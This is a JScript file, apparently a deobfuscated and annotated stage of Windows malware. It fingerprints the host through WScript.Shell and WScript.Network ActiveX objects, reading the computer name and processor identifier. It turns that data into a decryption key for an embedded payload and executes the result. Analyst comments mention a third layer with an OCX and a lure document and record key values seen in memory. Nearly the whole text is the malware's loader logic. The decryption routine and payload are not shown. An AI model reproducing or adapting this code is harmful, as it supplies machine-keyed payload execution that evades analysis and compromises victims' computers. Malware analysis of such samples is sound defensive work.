function SwitchKey(a)
{
    var r;
    if (a)
    {
        switch (a)
        {
            case " ":r = 32;
                break;
            case "!":r = 33;
                break;
            case '"':r = 34;
                break;
            case "#":r = 35;
                break;
            case "$":r = 36;
                break;
            case "%":r = 37;
                break;
            case "&":r = 38;
                break;
            case "'":r = 39;
                break;
            case "(":r = 40;
                break;
            case ")":r = 41;
                break;
            case "*":r = 42;
                break;
            case "+":r = 43;
                break;
            case ",":r = 44;
                break;
            case "-":r = 45;
                break;
            case ".":r = 46;
                break;
            case "/":r = 47;
                break;
            case "0":r = 48;
                break;
            case "1":r = 49;
                break;
            case "2":r = 50;
                break;
            case "3":r = 51;
                break;
            case "4":r = 52;
                break;
            case "5":r = 53;
                break;
            case "6":r = 54;
                break;
            case "7":r = 55;
                break;
            case "8":r = 56;
                break;
            case "9":r = 57;
                break;
            case ":":r = 58;
                break;
            case ";":r = 59;
                break;
            case "<":r = 60;
                break;
            case "=":r = 61;
                break;
            case ">":r = 62;
                break;
            case "?":r = 63;
                break;
            case "@":r = 64;
                break;
            case "A":r = 65;
                break;
            case "B":r = 66;
                break;
            case "C":r = 67;
                break;
            case "D":r = 68;
                break;
            case "E":r = 69;
                break;
            case "F":r = 70;
                break;
            case "G":r = 71;
                break;
            case "H":r = 72;
                break;
            case "I":r = 73;
                break;
            case "J":r = 74;
                break;
            case "K":r = 75;
                break;
            case "L":r = 76;
                break;
            case "M":r = 77;
                break;
            case "N":r = 78;
                break;
            case "O":r = 79;
                break;
            case "P":r = 80;
                break;
            case "Q":r = 81;
                break;
            case "R":r = 82;
                break;
            case "S":r = 83;
                break;
            case "T":r = 84;
                break;
            case "U":r = 85;
                break;
            case "V":r = 86;
                break;
            case "W":r = 87;
                break;
            case "X":r = 88;
                break;
            case "Y":r = 89;
                break;
            case "Z":r = 90;
                break;
            case "[":r = 91;
                break;
            case "\\":r = 92;
                break;
            case "]":r = 93;
                break;
            case "^":r = 94;
                break;
            case "_":r = 95;
                break;
            case "`":r = 96;
                break;
            case "a":r = 97;
                break;
            case "b":r = 98;
                break;
            case "c":r = 99;
                break;
            case "d":r = 100;
                break;
            case "e":r = 101;
                break;
            case "f":r = 102;
                break;
            case "g":r = 103;
                break;
            case "h":r = 104;
                break;
            case "i":r = 105;
                break;
            case "j":r = 106;
                break;
            case "k":r = 107;
                break;
            case "l":r = 108;
                break;
            case "m":r = 109;
                break;
            case "n":r = 110;
                break;
            case "o":r = 111;
                break;
            case "p":r = 112;
                break;
            case "q":r = 113;
                break;
            case "r":r = 114;
                break;
            case "s":r = 115;
                break;
            case "t":r = 116;
                break;
            case "u":r = 117;
                break;
            case "v":r = 118;
                break;
            case "w":r = 119;
                break;
            case "x":r = 120;
                break;
            case "y":r = 121;
                break;
            case "z":r = 122;
                break;
            case "{":r = 123;
                break;
            case "|":r = 124;
                break;
            case "}":r = 125;
                break;
            case "~":r = 126;
                break;
        }
        return r;
    }
}
function Get_ActiveXObjact(arg) {return new ActiveXObject(arg);}
function GetArch()
{
    try 
    {
        var shObj = Get_ActiveXObjact("WScript.Shell");
        var Process= shObj.Environment("PROCESS");
        var WSNetObj = Get_ActiveXObjact("WScript.Network");
        var arch = WSNetObj.ComputerName + Process("PROCESSOR_IDENTIFIER");
        return arch;
    } 
    catch(e) {return false;}
}
try 
{
    var tmp = GetArch();
	
    // Variables for the third layer -> ocx + lure doc ?
    trhxuhy049 = "";
    trhxuhy277 = "";
    trhxuhy1 = "";
    trhxuhy4018 = "";
	
    var l = tmp.length;
    var ArgsArray = tmp.split("");
    tabex[offset_tab] = SwitchKey(ArgsArray[0]);
    var i = 1;
do 
{
    tabex[offset_tab + i] = SwitchKey(ArgsArray[i]);
    i = i + 1;
} while (i < l);
tmp = "";
ArgsArray = [];
exec(Init(pay2, tabex, offset_tab + l, 50312));
} 
catch(e){trhxuhy5686 = '';}

/* values in memory

offset_tab -> 29
tabex -> 97,118,101,98,71,78,116,82,69,90,112,71,86,101,114,80,89,90,85,98,66,105,81,115,122,110,53,50,52

*/
